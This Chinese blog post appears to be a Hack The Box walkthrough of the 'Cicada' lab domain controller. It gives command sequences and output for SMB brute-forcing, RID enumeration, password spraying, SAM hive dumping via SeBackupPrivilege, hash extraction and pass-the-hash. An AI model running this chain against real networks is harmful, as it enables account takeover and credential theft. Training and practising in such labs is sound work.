---
layout: post
title: HTB——Cicada
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Cicada/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[07:34:13] [INFO] Start IpScan:10.129.231.149
[07:34:13] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[07:34:15] [+] 10.129.231.149:88 open
[07:34:15] [+] 10.129.231.149:53 open
[07:34:15] [+] 10.129.231.149:139 open
[07:34:15] [+] 10.129.231.149:135 open
[07:34:16] [+] 10.129.231.149:445 open
[07:34:16] [+] 10.129.231.149:389 open
[07:34:16] [+] 10.129.231.149:636 open
[07:34:16] [+] 10.129.231.149:593 open
[07:34:16] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.231.149:593 [ncacn_http/1.0]                                                                                      
[07:34:16] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.231.149:139 [.]
[07:34:16] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.231.149:135 [.@]
[07:34:16] [INFO] start WMI check 10.129.231.149:135
[07:34:16] [+] 开始 WmiExec 任务: WMI://10.129.231.149:135
[07:34:16] [+] [TCP/LDAP]   10.129.231.149:389 [0.a]
[07:34:16] [INFO] start LDAP check 10.129.231.149:389
[07:34:16] [+] 开始 LdapScan 任务: LDAP://10.129.231.149:389
[07:34:19] [+] 10.129.231.149:464 open
[07:34:21] [+] [TCP/MICROSOFT-DS]   10.129.231.149:445 
[07:34:21] [INFO] start SMB check 10.129.231.149:445
[07:34:21] [+] 开始 SmbScan 任务: SMB://10.129.231.149:445
[07:34:23] [+] [TCP/SPARK]  [Apache Spark] 10.129.231.149:88 [.]
[07:34:23] [+] [TCP/KPASSWD5]   10.129.231.149:464 
[07:34:27] [+] 10.129.231.149:3268 open
[07:34:27] [+] 10.129.231.149:3269 open
[07:34:31] [+] [TCP/LDAP]   10.129.231.149:3268 [0.a]
[07:34:31] [INFO] start LDAP check 10.129.231.149:3268
[07:34:31] [+] 开始 LdapScan 任务: LDAP://10.129.231.149:3268
[07:34:36] [+] [TCP/SSL]   10.129.231.149:636 [.g.M.g 1 <.VX.! cz2 DOWNGRD.]I.@ M.J.#.8u./.0.0.S.]                                                                                  
[07:34:36] [INFO] start LDAPS check 10.129.231.149:636
[07:34:36] [+] 开始 LdapsScan 任务: LDAPS://10.129.231.149:636
[07:34:37] [+] 10.129.231.149:5985 open
[07:34:40] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.231.149:3269 [0.d.y.0.q0.domainFunctionality1.70.forestFunctiona]                                       
[07:34:40] [INFO] start LDAP check 10.129.231.149:3269
[07:34:40] [+] 开始 LdapScan 任务: LDAP://10.129.231.149:3269
[07:34:43] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.231.149:5985 [Not Found]
[07:34:43] [INFO] start WinRM check 10.129.231.149:5985
[07:34:43] [+] 开始 WinRMScan 任务: WinRM://10.129.231.149:5985
[07:37:52] [+] 10.129.231.149:58299 open
[07:38:11] [+] [TCP/UNKNOWN]   10.129.231.149:58299 
                                                          ]
[07:38:22] [+] alive ports is: 13
[07:38:22] [+] Ip扫描结束:10.129.231.149
[07:38:22] [INFO] Start UrlScan:http://10.129.231.149:5985
[07:38:23] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.231.149:5985 [Not Found]                                                                                      
                                                 
[07:38:23] [+] Url扫描结束:http://10.129.231.149:5985
[07:38:23] [+] 项目任务完成:Default, Timeuse：250.411624045
[07:38:23] [+] 扫描结束,耗时: 4m11.98083042s
```

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                          
[2025-04-01 07:39:23] [INFO] 暴力破解线程数: 1                                            
[2025-04-01 07:39:23] [INFO] 开始信息扫描
[2025-04-01 07:39:23] [INFO] 最终有效主机数量: 1
[2025-04-01 07:39:23] [INFO] 开始主机扫描
[2025-04-01 07:39:23] [INFO] 有效端口数量: 233
[2025-04-01 07:39:24] [SUCCESS] 端口开放 10.129.231.149:88
[2025-04-01 07:39:24] [SUCCESS] 端口开放 10.129.231.149:135
[2025-04-01 07:39:24] [SUCCESS] 端口开放 10.129.231.149:139
[2025-04-01 07:39:24] [SUCCESS] 端口开放 10.129.231.149:389
[2025-04-01 07:39:24] [SUCCESS] 端口开放 10.129.231.149:445
[2025-04-01 07:39:29] [SUCCESS] 服务识别 10.129.231.149:88 => 
[2025-04-01 07:39:29] [SUCCESS] 服务识别 10.129.231.149:139 =>  Banner:[.]
[2025-04-01 07:39:29] [SUCCESS] 服务识别 10.129.231.149:445 => 
[2025-04-01 07:39:29] [SUCCESS] 服务识别 10.129.231.149:389 => 
[2025-04-01 07:40:29] [SUCCESS] 服务识别 10.129.231.149:135 => 
[2025-04-01 07:40:29] [INFO] 存活端口数量: 5
[2025-04-01 07:40:29] [INFO] 开始漏洞扫描
[2025-04-01 07:40:29] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                     
[2025-04-01 07:40:29] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.231.149                                                                  
主机名: CICADA-DC                                                                         
发现的网络接口:                                                                           
   IPv4地址:                                                                              
      └─ 10.129.231.149                                                                   
   IPv6地址:                                                                              
      └─ dead:beef::f016:482:fecf:9a4                                                     
      └─ dead:beef::158                                                                   
[2025-04-01 07:41:04] [INFO] SMB2共享信息 10.129.231.149:445 admin Pass:123456 共享:[ADMIN$ C$ DEV HR IPC$ NETLOGON SYSVOL]                                                         
[2025-04-01 07:41:10] [SUCCESS] SMB认证成功 10.129.231.149:445 admin:123456
```

---

# 0x02 SMB服务利用

---

竟然直接爆破出了SMB服务账密，但HTB的`Guided Mode`提醒我们先查看一下使用guest身份访问的非默认SMB名称。那我们先尝试匿名访问。

```bash
┌──(root㉿kali)-[/home/kali/penetration]
└─# smbclient -L //10.129.231.149 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.231.149 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

尝试交一下`HR`作为非默认目录，答案对上了。接下来我们再使用前面`fscan`爆破出的`admin:123456`作为凭据将HR中的内容全部下载下来。使用自带的`smbget`工具：

- [smbget命令 – 下载samba共享资源 – Linux命令大全(手册)](https://www.linuxcool.com/smbget)

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# smbclient //10.129.231.149/HR -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 477913 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> exit
```

从此文件中我们获取到了默认密码`Cicada$M6Corpb*@Lp#nZp!8`，但是我们还没获取到用户名。有一个小`trick`，使用`crackmapexec`随便填一个账户不填密码，并指定`--rid-brute`。此爆破语句在`Escapetwo`中也有用过，可自行翻阅。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# crackmapexec smb 10.129.231.149 -u dada -p '' --rid-brute | grep 'SidTypeUser'
SMB                      10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

整理为user字典，再次使用crackmapexec进行域内密码喷洒。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# crackmapexec smb 10.129.231.149 -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

获得了一个账户的账密。但是接下来就没思路了。借鉴WP发现可以使用此账户进一步枚举`SMB`服务下的各个信息。我们直接利用`SMB`枚举一下用户信息。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# crackmapexec smb 10.129.231.149 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        [+] Enumerated domain user(s)
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\emily.oscars                   badpwdcount: 1 desc:                                        
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 1 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                 
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\michael.wrightson              badpwdcount: 0 desc:                                        
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\sarah.dantelia                 badpwdcount: 2 desc:                                        
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\john.smoulder                  badpwdcount: 2 desc:                                        
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                            
SMB         10.129.231.149  445    CICADA-DC        cicada.htb\Administrator                  badpwdcount: 145 desc: Built-in account for administering the computer/domain
```

借此我们获得了新的账密信息`david.orelious:aRt$Lp#7t*VQ!3`。那我们先查看一下此账户有没有WinRM的权限。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# crackmapexec winrm 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' 
SMB         10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.129.231.149  5985   CICADA-DC        [*] http://10.129.231.149:5985/wsman
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```

很遗憾没有。但提示又转回了smb服务。我们之前利用时除去`HR`文件夹，还看到一个`DEV`文件夹。我们尝试使用此账户，看有没有对此文件夹的访问权限。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# smbclient //10.129.231.149/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 477385 blocks available
smb: \> get 'Backup_script.ps1'
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \'Backup_script.ps1'
smb: \> get "Backup_script.ps1"
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> exit
```

下载到一个`ps1`文件，我们照例查看一下此`ps1`文件的内容。获取到新的账密`emily.oscars:Q!3@Lp#M6b*7t*Vt`.我们利用此账户再次查看WinRM权限。之所以如此关注`WinRM`是因为只有此部分允许我们直接使用密码登录而非`NTLM hash`。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# crackmapexec winrm 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.129.231.149  5985   CICADA-DC        [*] http://10.129.231.149:5985/wsman
WINRM       10.129.231.149  5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

该用户有WinRM的权限。那我们直接`evil-WinRM`登陆一下即可。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Cicada/02.png?raw=true)

---

# 0x03 WinRM+SeBackupPrivilege

---

获取到user的flag后，我们查看该账户的权限，发现有很多被滥用的特权，太多了不知道该先写哪个。。。提交一通发现想让我们交的是`SeBackupPrivilege`

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

下一问让我们提交`Administrator`的`NTLM hash`。有这俩特权就很简单了。直接`SAM`转储一下即可。当初刚接触到以为是什么很高级的技法，现在一看也就是个基础知识，令人唏嘘。

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system .\SECURITY
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system .\SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/1/2025   1:30 PM          49152 SAM
-a----          4/1/2025   1:31 PM       18546688 SECURITY
-a----          4/1/2025   1:31 PM       18546688 SYSTEM
-ar---          4/1/2025  11:32 AM             34 user.txt
```

转储出来后我们下载到本地，并使用`impacket-secretsdump`工具进行解密。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Cicada]
└─# impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

注意此处`HTB`的答案有误，让我们提交`Administrator`的`NTLM hash`,但实际只需要我们提交其中的`nthash`。最后PTH传递一下即可拿到`root.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Cicada/03.png?raw=true)

---

# 0x04 总结

非常好靶机，使我的SMB旋转。总结就是域内SMB到处用，再喷洒一下加一个`SeBackupPrivilege`特权转储`SAM`或`NTDS.dit`。很基础的一台靶机，孩子很爱吃。